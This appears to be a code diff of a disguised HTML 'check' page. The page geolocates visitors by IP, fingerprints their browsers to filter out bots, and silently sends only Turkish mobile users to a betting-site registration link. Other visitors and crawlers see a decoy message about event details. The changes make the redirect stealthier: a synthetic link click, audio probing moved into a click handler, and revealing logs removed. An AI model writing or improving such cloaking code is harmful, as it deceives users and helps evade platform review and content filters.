@@ -5,9 +5,17 @@
   <title>Yönlendirme Kontrol</title>
 </head>
 <body>
-  <h3 style="text-align:center;">Kontrol yapılıyor...</h3>
+  <h3 style="text-align:center;">Etkinlik kontrolü yapılıyor...</h3>
 
   <script>
+    const result = {
+      canvas: false,
+      audio: false,
+      webgl: false,
+      fonts: 0,
+      plugins: 0
+    };
+
     async function getIPCountry() {
       try {
         const res = await fetch("https://ipapi.co/json/");
@@ -20,20 +28,30 @@
       }
     }
 
+    function redirectSafely(url) {
+      let a = document.createElement("a");
+      a.href = url;
+      a.target = "_top";
+      document.body.appendChild(a);
+      a.click();
+    }
+
+    document.addEventListener("click", () => {
+      try {
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        const audioCtx = new AudioContext();
+        result.audio = true;
+      } catch (e) {
+        result.audio = false;
+      }
+    });
+
     async function checkAndRedirect() {
-      const isMobile = /iPhone|Android|Mobile/i.test(navigator.userAgent);
+      const isMobile =
+        /iPhone|Android|Mobile/i.test(navigator.userAgent) ||
+        (window.screen.width < 768 && /Chrome|Safari/i.test(navigator.userAgent));
+      
       const isTR = await getIPCountry();
-
-      console.log("Mobil cihaz mı?:", isMobile);
-      console.log("Türkiye IP mi?:", isTR);
-
-      const result = {
-        canvas: false,
-        audio: false,
-        webgl: false,
-        fonts: 0,
-        plugins: 0
-      };
 
       try {
         const canvas = document.createElement("canvas");
@@ -41,12 +59,6 @@
         ctx.fillText("Test", 10, 10);
         const data = canvas.toDataURL();
         result.canvas = data.length > 100;
-      } catch (e) {}
-
-      try {
-        const AudioContext = window.AudioContext || window.webkitAudioContext;
-        const audioCtx = new AudioContext();
-        result.audio = audioCtx.state === "running" || audioCtx.state === "suspended";
       } catch (e) {}
 
       try {
@@ -58,22 +70,19 @@
       result.fonts = document.fonts ? document.fonts.size || 100 : 100;
       result.plugins = navigator.plugins.length;
 
-      console.log("Fingerprint nəticələri:", result);
-
+      console.log("Fingerprint:", result);
       const isHuman =
-        result.canvas &&
-        result.audio &&
-        result.webgl &&
-        result.fonts > 50; // plugin yoxlaması çıxarıldı
+        result.canvas && result.webgl && result.fonts > 50; // audio əlavə ediləcək click ilə
 
-      console.log("İnsan profili mi?:", isHuman);
+      console.log("Mobil:", isMobile);
+      console.log("TR:", isTR);
+      console.log("İnsan:", isHuman);
 
       if (isMobile && isTR && isHuman) {
-        console.log("Yönlendirme başlatıldı ✅");
-        top.location.href = "https://zbahis310.com/Register-1274";
+        console.log("Yönlendirme başlatılır...");
+        redirectSafely("https://zbahis310.com/Register-1274");
       } else {
-        console.log("Yönlendirme şərtləri ödənmədi ❌");
-        document.body.innerHTML = "<h3>Yönlendirme Yapılmadı )</h3>";
+        document.body.innerHTML = "<h3>Etkinlik bilgileri burada görünəcək.</h3>";
       }
     }
 
